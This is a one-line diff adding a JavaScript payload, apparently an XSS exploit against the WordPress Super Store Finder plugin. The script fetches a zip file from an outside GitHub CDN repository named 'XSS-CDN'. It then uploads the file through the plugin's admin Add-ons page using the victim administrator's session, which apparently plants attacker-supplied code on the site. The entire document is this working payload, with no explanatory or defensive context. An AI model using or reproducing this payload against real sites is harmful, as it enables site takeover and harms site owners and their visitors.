@@ -1,0 +1,1 @@
+(async()=>{let f=new FormData();f.append('fupload',await(await fetch('https://cdn.statically.io/gh/Xib3rR4dAr/XSS-CDN/main/ssf-marker-cluster-wp.zip')).blob(),'ssf-marker-cluster-wp.zip');await fetch('/wp-admin/admin.php?page=superstorefinder-wp%2Fssf-wp-admin%2Fpages%2FAdd-ons.php',{method:'POST',body:f})})(); 
